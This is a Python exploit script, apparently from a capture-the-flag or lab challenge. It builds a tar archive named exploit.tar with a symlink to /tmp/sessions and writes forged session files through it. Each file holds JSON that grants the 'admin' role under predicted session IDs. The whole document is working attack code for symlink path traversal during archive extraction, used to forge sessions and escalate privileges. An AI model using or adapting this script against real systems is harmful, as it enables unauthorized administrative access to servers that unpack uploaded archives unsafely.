import tarfile
import io
import os

def create_tar(session_ids, fake_username="noexist", user_id=1337):
    """
    Creates a TAR file in memory with a symlink to /tmp/sessions and admin session files for each session ID.
    
    :param session_ids: List of three possible session IDs (strings).
    :param fake_username: The fake username (default: "noexist").
    :param user_id: Arbitrary user ID for the JSON (default: 1337).
    :return: BytesIO object containing the TAR.
    """
    # Craft the admin JSON content
    json_content = f'{{"username":"{fake_username}","id":{user_id},"role":"admin"}}'.encode('utf-8')
    
    # Symlink name and target
    symlink_name = "tmp_link"
    symlink_target = "/tmp/sessions"
    
    # Create TAR in memory
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
        # Add symlink: tmp_link -> /tmp/sessions
        # Create a temporary symlink on disk to add to tar (tarfile requires real file for symlink)
        temp_symlink = "./temp_symlink"
        try:
            os.symlink(symlink_target, temp_symlink)
            tar.add(temp_symlink, arcname=symlink_name)
        finally:
            if os.path.exists(temp_symlink):
                os.remove(temp_symlink)
        
        # Add admin session files through the symlink path for each session ID
        for sid in session_ids:
            file_path = f"{symlink_name}/{fake_username}/{sid}"
            tarinfo = tarfile.TarInfo(file_path)
            tarinfo.size = len(json_content)
            tarinfo.mode = 0o644  # Regular file permissions
            tar.addfile(tarinfo, io.BytesIO(json_content))
    
    tar_buffer.seek(0)
    return tar_buffer

# Example usage: Replace with actual session IDs from previous step
if __name__ == "__main__":
    # Placeholder session IDs (from previous prediction script)
    example_session_ids = [
        "Replace_with_actual_session_id_1",
        "Replace_with_actual_session_id_2",
        "Replace_with_actual_session_id_3"
    ]
    
    tar_buffer = create_tar(example_session_ids)
    with open("exploit.tar", "wb") as f:
        f.write(tar_buffer.getvalue())
    print("TAR file created as exploit.tar")
